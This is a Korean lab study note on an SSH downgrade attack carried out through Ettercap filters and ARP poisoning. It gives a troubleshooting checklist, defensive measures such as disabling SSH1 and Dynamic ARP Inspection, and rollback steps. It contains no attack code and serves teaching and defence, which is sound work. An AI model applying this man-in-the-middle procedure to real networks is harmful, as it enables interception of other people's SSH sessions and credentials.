- [ ] `etter.filter.ssh.co`가 정상 생성되었는가?
- [ ] 컴파일한 filter를 Ettercap에 로드했는가?
- [ ] sniffing을 시작했는가?
- [ ] Client가 실제로 Server에 SSH 접속을 시도했는가?

### SSH 정책 문제

- [ ] Client / Server가 SSH1 또는 약한 호환 동작을 허용하는가?
- [ ] Host Key warning이 나타났는가?
- [ ] 현대 OpenSSH가 downgrade를 거부한 것은 아닌가?
- [ ] 방화벽이나 경로 문제로 SSH 자체가 막힌 것은 아닌가?
- [ ] R1의 `show ip ssh`에서 SSH 버전 상태를 확인했는가?
- [ ] SSH 서버 대상 IP를 `172.16.0.150` 같은 다른 서버와 혼동하지 않았는가?
- [ ] RSA 키 재생성 후 SSH가 다시 활성화되었는가?

### 기대값 문제

- [ ] 배너 조작과 인증 정보 노출을 같은 성공으로 착각하고 있지 않은가?
- [ ] 공격 실패를 무조건 실습 실패로 해석하고 있지 않은가?

---

## 방어 후 검증

- SSH1을 허용하지 않는다.
- 최신 OpenSSH를 사용한다.
- Host Key warning을 확인한다.
- 약한 알고리즘과 구형 호환 설정을 줄인다.
- L2 구간에서 MITM 위치 확보를 어렵게 만든다.
  - [[Dynamic ARP Inspection]]
  - DHCP Snooping

---

## 실습 종료 / 롤백

실습이 끝나면 다음을 확인한다.

- Ettercap sniffing을 중지한다.
- ARP Poisoning을 종료한다.
- 필요하면 각 호스트의 ARP cache를 확인하거나 갱신한다.
- 정상 SSH 연결이 다시 기대한 방식으로 동작하는지 확인한다.

PDF는 구체 롤백 명령까지 제시하지 않으므로, 이 노트에서는 확인되지 않은 명령을 invent하지 않는다.

---

## 관련 노트

- [[SSH 보안 구조]]
- [[SSH Downgrade Attack]]
- [[Ettercap Filter 패킷 변조 실습]]
- [[SSH 암호화 패킷 관찰]]
- [[ARP 스푸핑]]
- [[Dynamic ARP Inspection]]
